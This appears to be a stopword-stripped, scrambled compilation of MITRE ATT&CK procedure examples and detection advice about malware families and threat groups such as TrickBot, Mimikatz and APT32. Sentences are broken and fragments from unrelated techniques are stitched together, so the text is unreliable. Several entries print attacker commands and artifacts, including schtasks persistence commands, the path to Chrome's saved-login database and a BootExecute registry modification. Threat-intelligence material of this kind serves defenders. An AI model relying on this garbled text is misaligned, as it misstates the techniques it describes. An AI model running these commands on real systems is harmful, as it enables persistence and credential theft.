Pay2Kitten December 2020) [SQLRat](https://attack.mitre.org/software/S0390) direct SQL connection database controlled attackers, retrieve item bindata table, write execute file disk.(Citation: Flashpoint FIN 7 March 2019)	 requiring password, adversary terminal access, password sudoers file. [OutSteel](https://attack.mitre.org/software/S1017) distributed malicious links contained spearphishing emails.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) Monitor API calls altering data. Remote access tools built-in features interact Windows API gather information. (Citation: NCC TA505) Monitor newly constructed files phishing messages gain access victim systems. [Cobalt Group](https://attack.mitre.org/groups/G0080) <code>odbcconf</code> proxy execution malicious DLL files.(Citation: TrendMicro Cobalt Nov 2017) [Bumblebee](https://attack.mitre.org/software/S1039) send collected data JSON format C2.(Citation: Google EXOTIC LILY March 2022) user training bring awareness common phishing spearphishing techniques raise suspicion malicious events. [AppleJeus](https://attack.mitre.org/software/S0584) exfiltrated collected host C2 server.(Citation: CISA AppleJeus Feb 2021) [Chaes](https://attack.mitre.org/software/S0631) encryption C2 channel.(Citation: Cybereason Chaes Nov 2020)  Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Industroyer](https://attack.mitre.org/software/S0604) custom port scanner map network.(Citation: ESET Industroyer) Monitor DLL loads processes, DLLs recognized loaded process. abnormal process behavior process loading malicious DLL. Data events viewed isolation, chain behavior lead activities, network connections Command Control, learning details environment Discovery, conducting Lateral Movement. [DarkComet](https://attack.mitre.org/software/S0334) execute types scripts victim’s machine.(Citation: Malwarebytes DarkComet March 2018) [SideCopy](https://attack.mitre.org/groups/G1008) delivered trojanized executables spearphishing emails contacts actor-controlled servers download malicious payloads.(Citation: MalwareBytes SideCopy Dec 2021) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors [Mimikatz](https://attack.mitre.org/software/S0002) dump certificates private Windows certificate store.(Citation: FoxIT Wocao December 2019) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Unknown Logger](https://attack.mitre.org/software/S0130) victim usernames.(Citation: Forcepoint Monsoon) Deny direct remote access internal systems network proxies, gateways, firewalls. [APT32](https://attack.mitre.org/groups/G0050) compromised McAfee ePO laterally distributing malware software deployment task.(Citation: FireEye APT32 2017) <code>net start</code> command [Net](https://attack.mitre.org/software/S0039) Windows services.(Citation: Savill 1999) [zwShell](https://attack.mitre.org/software/S0350) RDP lateral movement.(Citation: McAfee Night Dragon) [JPIN](https://attack.mitre.org/software/S0201) command-line utility cacls.exe change file permissions.(Citation: PLATINUM April 2016) [ZeroT](https://attack.mitre.org/software/S0230) add service ensure [PlugX](https://attack.mitre.org/software/S0013) persists delivered payload system.(Citation: Proofpoint ZeroT Feb 2017) [Avaddon](https://attack.mitre.org/software/S0640) checks specific keyboard layouts OS languages avoid targeting Commonwealth Independent (CIS) entities.(Citation: Arxiv Avaddon Feb 2021) Limit privileges user accounts remediate Privilege Escalation vectors authorized administrators create scheduled tasks remote systems. Monitor API calls employ time-based methods detect avoid virtualization analysis environments. Detecting actions virtualization sandbox identification difficult depending adversary's implementation monitoring required. [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) cleanup module removes traces victim.(Citation: Symantec Dragonfly) Monitor anomalous authentication activity, logons user session activity unknown accounts. Monitor unexpected abnormal access resources, including access websites cloud-based applications user locations systems match expected configurations. [Hancitor](https://attack.mitre.org/software/S0499) malicious Word documents, email, prompted victim enable macros.(Citation: FireEye Hancitor) process monitoring monitor execution arguments verclsid.exe. Compare invocations verclsid.exe prior history arguments loaded files determine anomalous adversarial activity. Depending environment, unusual verclsid.exe parent process Office product. unusual verclsid.exe child processes network connections file modifications. (Citation: Mandiant APT1) [Revenge RAT](https://attack.mitre.org/software/S0379) plugin keylogging.(Citation: Cylance Shaheen Nov 2018)(Citation: Cofense RevengeRAT Feb 2019) [PcShare](https://attack.mitre.org/software/S1050) list running processes compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020) [Shark](https://attack.mitre.org/software/S1019) query `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography MachineGuid` retrieve machine GUID.(Citation: Accenture Lyceum Targets November 2021) [Silence](https://attack.mitre.org/groups/G0091) scheduled tasks stage operation.(Citation: Cyber Forensicator Silence Jan 2019) [Azorult](https://attack.mitre.org/software/S0344) collect username victim’s machine.(Citation: Unit42 Azorult Nov 2018) Monitor process memory inconsistencies compared DLL files disk checking memory ranges legitimate module.(Citation: Hiding Malicious Code Module Stomping) Monitor newly executed processes abuse IPC mechanisms [Sandworm Team](https://attack.mitre.org/groups/G0034) PowerShell scripts credential harvesting tool memory evade defenses.(Citation: District Court Indictment GRU Unit 74455 October 2020)(Citation: Dragos Crashoverride 2018)  [Orangeworm](https://attack.mitre.org/groups/G0071) C2.(Citation: Symantec Orangeworm IOCs April 2018) loaded memory, [MESSAGETAP](https://attack.mitre.org/software/S0443) deletes keyword_parm.txt parm.txt configuration files disk. (Citation: FireEye MESSAGETAP October 2019) [Amadey](https://attack.mitre.org/software/S1025) fast flux DNS C2.(Citation: Korean FSI TA505 2020) Windows 10, enable Attack Surface Reduction (ASR) rules prevent Office applications creating child processes writing malicious executable content disk. (Citation: win10_asr) [BLUELIGHT](https://attack.mitre.org/software/S0657) collected OS version victim machines.(Citation: Volexity InkySquid BLUELIGHT August 2021) Monitor executed commands arguments actions aid compression encrypting data collected prior exfiltration, tar.  [PowerSploit](https://attack.mitre.org/software/S0194) reflectively loads Windows file process.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [njRAT](https://attack.mitre.org/software/S0385) browse file systems file manager module.(Citation: Fidelis njRAT June 2013) [OceanSalt](https://attack.mitre.org/software/S0346) encode data operation sending data control server.(Citation: McAfee Oceansalt Oct 2018) [Milan](https://attack.mitre.org/software/S1015) enumerate targeted machine's GUID.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021) [ServHelper](https://attack.mitre.org/software/S0382) execute commands [cmd](https://attack.mitre.org/software/S0106).(Citation: Proofpoint TA505 Jan 2019)(Citation: Deep Instinct TA505 Apr 2019) Monitor Registry writes <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code>. Autoruns utility, checks Registry key persistence mechanism (Citation: TechNet Autoruns) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. Monitor investigate attempts modify extended file attributes utilities as <code>xattr</code>. Built-in utilities generate false positive alerts, compare baseline knowledge systems typically correlate modification events indications malicious activity possible.  [Pass-The-Hash Toolkit](https://attack.mitre.org/software/S0122) perform pass hash.(Citation: Mandiant APT1) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [Tonto Team](https://attack.mitre.org/groups/G0131) routed traffic external server obfuscate location.(Citation: TrendMicro Tonto Team October 2020) (Citation: FireEye Ryuk Trickbot January 2019)(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 2 Hour Speed November 2020)(Citation: Red Canary Hospital Thwarted Ryuk October 2020) Monitor API calls attempt detailed operating hardware, including version, patches, hotfixes, service packs, architecture. Remote access tools built-in features interact Windows API gather information. acquired Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001). cloud-based systems, native logging identify access APIs dashboards information. Depending environment used, data benign normal operations. Monitor Registry entries password filters (ex: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages) correlate investigate DLL files files reference. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware unusual data transfer protocols FTP mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools.(Citation: University Birmingham C2) [Chimera](https://attack.mitre.org/groups/G0114) scheduled tasks invoke Cobalt Strike including batch script <code>schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.bat" /sc /f /st</code> maintain persistence.(Citation: Cycraft Chimera April 2020)(Citation: NCC Chimera January 2021) [Gamaredon Group](https://attack.mitre.org/groups/G0047) deployed scripts compromised systems automatically scan documents.(Citation: ESET Gamaredon June 2020) [Zebrocy](https://attack.mitre.org/software/S0251) <code>netstat -aon</code> gather network connection information.(Citation: ESET Zebrocy 2019) [Patchwork](https://attack.mitre.org/groups/G0040) dumped login data database <code>\AppData\Local\Google\Chrome\User Data\Default\Login Data</code>.(Citation: Cymmetria Patchwork) [Gazer](https://attack.mitre.org/software/S0168) versions, compilation timestamp faked.(Citation: ESET Gazer Aug 2017) [Cleaver](https://attack.mitre.org/groups/G0003) custom tools facilitate ARP cache poisoning.(Citation: Cylance Cleaver) [RTM](https://attack.mitre.org/software/S0148) collects data clipboard.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019) [Gamaredon Group](https://attack.mitre.org/groups/G0047) legitimate process names hide malware including <code>svchosst</code>.(Citation: Unit 42 Gamaredon February 2022) [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors dynamic DNS services, including Duck DNS DNS Exit, C2 infrastructure.(Citation: ESET Operation Spalax Jan 2021) [Darkhotel](https://attack.mitre.org/groups/G0012) AES-256 3DES C2 communications.(Citation: DUBNIUM July 2016) [PS1](https://attack.mitre.org/software/S0613) inject payload DLL memory.(Citation: BlackBerry CostaRicto November 2020) Prevent credential overlap systems administrator privileged accounts. (Citation: FireEye WMI 2015) [Ixeshe](https://attack.mitre.org/software/S0015) list running processes.(Citation: Trend Micro IXESHE 2012) [TinyTurla](https://attack.mitre.org/software/S0668) deployed `w64time.dll` legitimate.(Citation: Talos TinyTurla September 2021) [Bundlore](https://attack.mitre.org/software/S0482) <code>ps</code> command list processes.(Citation: MacKeeper Bundlore Apr 2019) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) Monitor newly executed processes abuse Unix commands scripts execution. (Citation: FireEye APT37 Feb 2018) Monitor launch agents repeatedly execute malicious payloads persistence. [Denis](https://attack.mitre.org/software/S0354) performed process hollowing API calls CreateRemoteThread, ResumeThread, Wow64SetThreadContext.(Citation: Cybereason Cobalt Kitty 2017) [SDBbot](https://attack.mitre.org/software/S0461) ability application shimming persistence detects running admin Windows XP 7, creating shim database patch services.exe.(Citation: Proofpoint TA505 October 2019) [Out1](https://attack.mitre.org/software/S0594) HTTPS communications remote hosts.(Citation: Trend Micro Muddy Water March 2021) [HAMMERTOSS](https://attack.mitre.org/software/S0037) exfiltrates data uploading accounts created actors cloud storage providers adversaries retrieve later.(Citation: FireEye APT29) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors spearphishing emails links compromised websites malware downloaded.(Citation: McAfee Night Dragon) [Gelsemium](https://attack.mitre.org/software/S0666) drop `C:\Windows\System32\spool\prtprocs\x64\winprint.dll` alternative Print Processor loaded automatically spoolsv Windows service starts.(Citation: ESET Gelsemium June 2021) [APT37](https://attack.mitre.org/groups/G0067) HTTPS conceal C2 communications.(Citation: Talos Group123) [Attor](https://attack.mitre.org/software/S0438) encrypted data symmetrically randomly generated Blowfish (OFB) key encrypted public RSA key.(Citation: ESET Attor Oct 2019) multi-factor authentication user privileged accounts. [Ursnif](https://attack.mitre.org/software/S0386) tmp files stage gathered information.(Citation: TrendMicro Ursnif Mar 2015) [Grandoreiro](https://attack.mitre.org/software/S0531) steal victim's cookies duplicating active session device.(Citation: IBM Grandoreiro April 2020) [Diavol](https://attack.mitre.org/software/S0659) encrypted files RSA key `CryptEncrypt` API appended filenames ".lock64". (Citation: Fortinet Diavol July 2021) [TSCookie](https://attack.mitre.org/software/S0436) ability upload download files infected host.(Citation: JPCert TSCookie March 2018) [iKitten](https://attack.mitre.org/software/S0278) current IP address.(Citation: objsee mac malware 2017) [Okrum](https://attack.mitre.org/software/S0439)'s backdoor cmd.exe execute arbitrary commands batch scripts update version.(Citation: ESET Okrum July 2019) [HermeticWizard](https://attack.mitre.org/software/S0698) signed valid certificates assigned Hermetica Digital.(Citation: ESET Hermetic Wizard March 2022) Develop publish policies define acceptable stored code repositories. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Malware researchers reverse engineer malware variants DGAs determine future domains malware attempt contact, time resource intensive effort.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA Brute Force) Malware increasingly incorporating seed values unique instance, determined extract future generated domains. cases, seed sample extracted DNS traffic.(Citation: Akamai DGA Mitigation) so, thousands domains generated day; impractical defenders preemptively register C2 domains cost. [Patchwork](https://attack.mitre.org/groups/G0040) file stealer TaskScheduler DLL add persistence.(Citation: TrendMicro Patchwork Dec 2017) [UNC2452](https://attack.mitre.org/groups/G0118) 7-Zip compress stolen emails password-protected archives prior exfiltration.(Citation: Volexity SolarWinds)(Citation: Deep Dive Solorigate January 2021) [WindTail](https://attack.mitre.org/software/S0466) invoke Apple APIs <code>contentsOfDirectoryAtPath</code>, <code>pathExtension</code>, (string) <code>compare</code>.(Citation: objective-see windtail2 jan 2019) Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: TechNet Moving EMET) Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia Control Flow Integrity) protections depend architecture target application binary compatibility. (Citation: Proofpoint TA505 Sep 2017)(Citation: Proofpoint TA505 June 2018)(Citation: IBM TA505 April 2020) (Citation: FireEye FIN10 June 2017) [Bumblebee](https://attack.mitre.org/software/S1039) `cmd.exe` drop files.(Citation: Google EXOTIC LILY March 2022)(Citation: Proofpoint Bumblebee April 2022) [Leafminer](https://attack.mitre.org/groups/G0077) tools [LaZagne](https://attack.mitre.org/software/S0349), [Mimikatz](https://attack.mitre.org/software/S0002), [PsExec](https://attack.mitre.org/software/S0029), [MailSniper](https://attack.mitre.org/software/S0413).(Citation: Symantec Leafminer July 2018)  [HyperBro](https://attack.mitre.org/software/S0398) shellcode injects newly created process.(Citation: Unit42 Emissary Panda 2019) Monitor windows registry values abuse services daemons execute commands programs. [Sidewinder](https://attack.mitre.org/groups/G0121) tools identify running processes victim's machine.(Citation: ATT Sidewinder January 2021) (Citation: ESET BackdoorDiplomacy Jun 2021) [Ursnif](https://attack.mitre.org/software/S0386) <code>CreateProcessW</code> create child processes.(Citation: FireEye Ursnif Nov 2017) [Skidmap](https://attack.mitre.org/software/S0468) ability download files infected host.(Citation: Trend Micro Skidmap)  Monitor files abuse legitimate extensible development features servers establish persistent access systems. [MuddyWater](https://attack.mitre.org/groups/G0069) performed credential dumping [LaZagne](https://attack.mitre.org/software/S0349).(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018) store credentials Registry. [yty](https://attack.mitre.org/software/S0248) establishes persistence creating scheduled task command <code>SchTasks /Create /SC DAILY /TN BigData /TR “ + path_file + “/ST 09:30“</code>.(Citation: ASERT Donot March 2018) [EVILNUM](https://attack.mitre.org/software/S0568) achieve persistence Registry key.(Citation: ESET EvilNum July 2020)(Citation: Prevailion EvilNum 2020) Disable Hyper-V environment. Monitor process execution logs include PowerShell Transcription focusing perform combination behaviors including reading browser process memory, utilizing regular expressions, numerous keywords common applications (Gmail, Twitter, Office365, etc.). [Emissary](https://attack.mitre.org/software/S0082) capability execute command <code>ipconfig /all</code>.(Citation: Emissary Trojan Feb 2016) [TrickBot](https://attack.mitre.org/software/S0266) ports 447 8082 C2 communications.(Citation: S2 Grupo TrickBot June 2017)(Citation: Fidelis TrickBot Oct 2016)(Citation: Trend Micro Totbrick Oct 2016) [zwShell](https://attack.mitre.org/software/S0350) copied network shares laterally.(Citation: McAfee Night Dragon) [APT32](https://attack.mitre.org/groups/G0050) deployed tools moving laterally administrative accounts.(Citation: Cybereason Cobalt Kitty 2017)	 [SoreFang](https://attack.mitre.org/software/S0516) enumerate processes victim machine [Tasklist](https://attack.mitre.org/software/S0057).(Citation: CISA SoreFang July 2016) [Regin](https://attack.mitre.org/software/S0019) malware platform Extended Attributes store encrypted executables.(Citation: Kaspersky Regin) [APT32](https://attack.mitre.org/groups/G0050) NTFS alternate data streams hide payloads.(Citation: Cybereason Cobalt Kitty 2017) [Carbon](https://attack.mitre.org/software/S0335) Pastebin receive C2 commands.(Citation: Accenture HyperStack October 2020) [NanoCore](https://attack.mitre.org/software/S0336) access victim's webcam capture data.(Citation: DigiTrust NanoCore Jan 2017)(Citation: PaloAlto NanoCore Feb 2016) Monitor suspicious account behavior systems share accounts, user, admin, service accounts. Examples: account logged multiple systems simultaneously; multiple accounts logged machine simultaneously; accounts logged odd times business hours. Activity interactive login sessions process ownership accounts execute binaries remote account.  [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) <code>FileReadZipSend</code> compress file send C2.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [InvisiMole](https://attack.mitre.org/software/S0260) deleted files directories including XML files uploaded C2 servers.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) (Citation: Cylance Dust Storm) (Citation: FireEye APT38 Oct 2018) Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature block methods trusted binaries bypass application control. Monitor log files process execution command-line scripting activities. gaining additional insight adversaries' actions native processes custom tools. monitor loading modules specific languages. [HEXANE](https://attack.mitre.org/groups/G1001) collected hostname compromised machine.(Citation: Kaspersky Lyceum October 2021) [APT33](https://attack.mitre.org/groups/G0064) WinRAR compress data prior exfil.(Citation: Symantec Elfin Mar 2019)	
 endpoint security solutions configured block types process injection based common sequences behavior occur injection process.  [SUGARDUMP](https://attack.mitre.org/software/S1042) variants harvested credentials browsers Firefox, Chrome, Opera, Edge.(Citation: Mandiant UNC3890 Aug 2022) [NBTscan](https://attack.mitre.org/software/S0590) collect MAC addresses.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)	 [Revenge RAT](https://attack.mitre.org/software/S0379) ability upload download files.(Citation: Cylance Shaheen Nov 2018) [LoJax](https://attack.mitre.org/software/S0397) modified Registry key <code>‘HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute’</code> <code>‘autocheck autochk *’</code> <code>‘autocheck autoche *’</code>.(Citation: ESET LoJax Sept 2018) [AuTo Stealer](https://attack.mitre.org/software/S1029) ability collect username infected host.(Citation: MalwareBytes SideCopy Dec 2021) Monitor executed commands arguments attempt dump credentials account login credential material, form hash password, operating software. command-lines invoke AuditD Security Accounts Manager (SAM). Remote access tools built-in features incorporate existing tools [Mimikatz](https://attack.mitre.org/software/S0002). [PowerShell](https://attack.mitre.org/techniques/T1059/001) scripts exist credential dumping functionality, PowerSploit's Invoke-Mimikatz module, (Citation: Powersploit) require additional logging features configured operating collect analysis. [Avaddon](https://attack.mitre.org/software/S0640) decrypted encrypted strings.(Citation: Arxiv Avaddon Feb 2021) Limit service accounts minimal required privileges, including membership privileged Domain Administrators. (Citation: AdSecurity Cracking Kerberos Dec 2015) Monitor executed processes (such tracert ping) check Internet connectivity compromised systems. [APT28](https://attack.mitre.org/groups/G0007) modified obfuscated version reGeorg maintain persistence target's Outlook Access (OWA) server.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [InvisiMole](https://attack.mitre.org/software/S0260) configured servers alternate C2 communications.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) Monitor newly executed processes  process executable paths named partial directories. [TeamTNT](https://attack.mitre.org/groups/G0139) established persistence creation cryptocurrency mining service <code>systemctl</code>.(Citation: Trend Micro TeamTNT)(Citation: Cisco Talos Intelligence Group) [FIN6](https://attack.mitre.org/groups/G0037) scripting iterate list compromised PoS systems, data log file, remove original data files.(Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019) Monitor API calls (such <code>IsDebuggerPresent()</code>) employ detect avoid debugged environments. Detecting actions debugger identification difficult depending adversary's implementation monitoring required. [FIN7](https://attack.mitre.org/groups/G0046) malware created scheduled tasks establish persistence.(Citation: FireEye FIN7 April 2017)(Citation: Morphisec FIN7 June 2017)(Citation: FireEye FIN7 Aug 2018)(Citation: Flashpoint FIN 7 March 2019) [PcShare](https://attack.mitre.org/software/S1050) screen shots compromised machine.(Citation: Bitdefender FunnyDream Campaign November 2020) [KOCTOPUS](https://attack.mitre.org/software/S0669) distributed malicious link email.(Citation: MalwareBytes LazyScripter Feb 2021) Monitor account management events Domain Controllers successful failed SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: DsAddSidHistory) [Linux Rabbit](https://attack.mitre.org/software/S0362) attempts gain access server SSH.(Citation: Anomali Linux Rabbit 2018) [Proton](https://attack.mitre.org/software/S0279) removes files /tmp directory.(Citation: objsee mac malware 2017) [Lokibot](https://attack.mitre.org/software/S0447) stolen credentials multiple applications data sources including Windows OS credentials, email clients, FTP, SFTP clients.(Citation: Infoblox Lokibot January 2019) [PUNCHTRACK](https://attack.mitre.org/software/S0197) loaded executed highly obfuscated launcher.(Citation: FireEye Fin8 2016) [MiniDuke](https://attack.mitre.org/software/S0051) components Twitter initially address C2 server backup hard-coded C2 server responds.(Citation: F-Secure Dukes)(Citation: Securelist MiniDuke Feb 2013)(Citation: ESET Dukes October 2019) Monitor executed commands arguments achieve persistence adding program startup folder referencing Registry key. [Matryoshka](https://attack.mitre.org/software/S0167) capable keylogging.(Citation: ClearSky Wilted Tulip July 2017)(Citation: CopyKittens Nov 2015) Upgrade Windows 8 enable secure boot. [ZxShell](https://attack.mitre.org/software/S0412) supports functionality VNC sessions.(Citation: Talos ZxShell Oct 2014)  [Wizard Spider](https://attack.mitre.org/groups/G0102) WMI LDAP queries network discovery laterally.(Citation: CrowdStrike Grim Spider 2019)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: Red Canary Hospital Thwarted Ryuk October 2020) [Mosquito](https://attack.mitre.org/software/S0256)'s launcher rundll32.exe Registry Key start main backdoor capability.(Citation: ESET Turla Mosquito Jan 2018) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g. unauthorized, gratuitous, anomalous traffic patterns attempting access internal external websites services). correlating application monitoring indication unplanned service interruptions unauthorized content changes. [Clop](https://attack.mitre.org/software/S0611) <code>sleep</code> command avoid sandbox detection.(Citation: Unit42 Clop April 2021) [SYNful Knock](https://attack.mitre.org/software/S0519) malware inserted network device patching operating image.(Citation: Mandiant - Synful Knock)(Citation: Cisco Synful Knock Evolution) [Ajax Security Team](https://attack.mitre.org/groups/G0130) CWoolger MPK, custom-developed malware, recorded keystrokes infected system.(Citation: Check Rocket Kitten) [Orz](https://attack.mitre.org/software/S0229) gather process list victim.(Citation: Proofpoint Leviathan Oct 2017) [PinchDuke](https://attack.mitre.org/software/S0048) searches files created timeframe file extension matches predefined list.(Citation: F-Secure Dukes) [Deep Panda](https://attack.mitre.org/groups/G0009) [Tasklist](https://attack.mitre.org/software/S0057) utility list processes running systems.(Citation: Alperovitch 2014) [PowerDuke](https://attack.mitre.org/software/S0139) commands victim's name, build, version, serial number, memory usage.(Citation: Volexity PowerDuke November 2016) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors enticed users links spearphishing emails download malware.(Citation: McAfee Night Dragon) [Valak](https://attack.mitre.org/software/S0476) ability save execute files alternate data streams (ADS).(Citation: Cybereason Valak 2020)(Citation: Unit 42 Valak July 2020)(Citation: SentinelOne Valak June 2020) Configure settings scheduled tasks force tasks context authenticated account allowing SYSTEM. Registry key located <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\SubmitControl</code>. setting configured GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: server operators schedule tasks, set disabled. (Citation: TechNet Server Operator Scheduled Task)  [Small Sieve](https://attack.mitre.org/software/S1035) `cmd.exe` execute commands victim's system.(Citation: NCSC GCHQ Sieve Jan 2022) [Remsec](https://attack.mitre.org/software/S0125)'s network loader encrypts C2 traffic RSA RC6.(Citation: Symantec Remsec IOCs) [WindTail](https://attack.mitre.org/software/S0466) ability enumerate users directory path application bundle.(Citation: objective-see windtail1 dec 2018)(Citation: objective-see windtail2 jan 2019) [APT37](https://attack.mitre.org/groups/G0067) steganography send images users embedded shellcode.(Citation: Talos Group123)(Citation: Securelist ScarCruft 2019) Suspicious systemd services identified comparing trusted baseline. Malicious systemd services detected systemctl utility examine wide services: <code>systemctl list-units -–type=service –all</code>. Auditing execution command-line arguments 'systemctl' utility, utilities <code>/usr/sbin/service</code> reveal malicious systemd service execution. [Kimsuky](https://attack.mitre.org/groups/G0094) Blogspot host malicious content beacons, file exfiltrators, implants.(Citation: Talos Kimsuky Nov 2021) [FlawedAmmyy](https://attack.mitre.org/software/S0381) collect keyboard events.(Citation: Korean FSI TA505 2020) [Cardinal RAT](https://attack.mitre.org/software/S0348) execute commands.(Citation: PaloAlto CardinalRat Apr 2017) [JCry](https://attack.mitre.org/software/S0389) created payloads Startup directory maintain persistence. (Citation: Carbon Black JCry 2019) [ECCENTRICBANDWAGON](https://attack.mitre.org/software/S0593) encrypted strings RC4.(Citation: CISA EB Aug 2020) [Elderwood](https://attack.mitre.org/groups/G0066) delivered zero-day exploits malware victims targeted emails link malicious content hosted uncommon server.(Citation: Symantec Elderwood Sept 2012)(Citation: CSM Elderwood Sept 2012) [PoetRAT](https://attack.mitre.org/software/S0428) spearphishing attachments infect victims.(Citation: Talos PoetRAT April 2020) [Kimsuky](https://attack.mitre.org/groups/G0094) downloaded additional scripts, tools, malware victim systems.(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: Talos Kimsuky Nov 2021) [APT38](https://attack.mitre.org/groups/G0082) installed Windows service establish persistence.(Citation: CISA AA20-239A BeagleBoyz August 2020) [Carberp](https://attack.mitre.org/software/S0484) masqueraded Windows file names, "chkntfs.exe" "syscron.exe".(Citation: Prevx Carberp March 2011)(Citation: Trusteer Carberp October 2010) [Drovorub](https://attack.mitre.org/software/S0502) XOR encrypted payloads WebSocket client server messages.(Citation: NSA/FBI Drovorub August 2020) [Meteor](https://attack.mitre.org/software/S0688) ability download additional files execution victim's machine.(Citation: Check Meteor Aug 2021) [ZLib](https://attack.mitre.org/software/S0086) ability download files.(Citation: Cylance Dust Storm) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `systeminfo` command gather details compromised system.(Citation: Cybereason OperationCuckooBees 2022) [PHOREAL](https://attack.mitre.org/software/S0158) capable manipulating Registry.(Citation: FireEye APT32 2017) (Citation: FireEye APT41 March 2020) [Azorult](https://attack.mitre.org/software/S0344) decrypt payload memory, create suspended process itself, inject decrypted payload process resume process execution.(Citation: Unit42 Azorult Nov 2018) [Bazar](https://attack.mitre.org/software/S0534) enumerate shared drives domain.(Citation: NCC Team9 June 2020) [Diavol](https://attack.mitre.org/software/S0659) terminate services Service Control Manager (SCM) API.(Citation: Fortinet Diavol July 2021)  [Lokibot](https://attack.mitre.org/software/S0447) reflectively loaded decoded DLL memory.(Citation: Talos Lokibot Jan 2021)  [jRAT](https://attack.mitre.org/software/S0283) capability capture video webcam.(Citation: jRAT Symantec Aug 2018)(Citation: Kaspersky Adwind Feb 2016) [Volatile Cedar](https://attack.mitre.org/groups/G0123) DirBuster GoBuster brute force directories DNS subdomains.(Citation: ClearSky Lebanese Cedar Jan 2021) [Sandworm Team](https://attack.mitre.org/groups/G0034)'s BCS-server tool create internal proxy server redirect traffic adversary-controlled C2 internal servers connected internet, interconnected locally.(Citation: ESET Telebots Dec 2016)	 Monitor executed commands arguments establish persistence executing malicious content triggered Netsh Helper DLLs. [APT-C-36](https://attack.mitre.org/groups/G0099) prompted victims accept macros execute subsequent payload.(Citation: QiAnXin APT-C-36 Feb2019) [Kevin](https://attack.mitre.org/software/S1020) collect MAC address victim machine `ipconfig/all`.(Citation: Kaspersky Lyceum October 2021) Monitor suspicious network traffic indicative probing email addresses usernames, large/iterative quantities authentication requests originating single source (especially source adversary/botnet). Analyzing metadata reveal artifacts attributed malicious activity, referer user-agent string HTTP/S fields. [EVILNUM](https://attack.mitre.org/software/S0568) function called "DeleteLeftovers" remove artifacts attack.(Citation: Prevailion EvilNum 2020) [Bundlore](https://attack.mitre.org/software/S0482) leveraged /bin/sh /bin/bash execute commands victim machine.(Citation: MacKeeper Bundlore Apr 2019) Monitor newly executed processes abuse Outlook rules persistence compromised system. [HAWKBALL](https://attack.mitre.org/software/S0391) encrypted payload XOR-based algorithm.(Citation: FireEye HAWKBALL Jun 2019) Monitor analyze network flows protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns). analyzing newly constructed network connections received untrusted hosts, unexpected hardware devices, uncommon data flows. (Citation: DFIR Conti Bazar Nov 2021) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) command delete file system. [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) deletes app bundle dropper execution.(Citation: TrendMicro MacOS April 2018)(Citation: Trend Micro MacOS Backdoor November 2020) [PoetRAT](https://attack.mitre.org/software/S0428) TLS encrypt communications port 143(Citation: Talos PoetRAT April 2020) Monitor executed commands arguments logon scripts 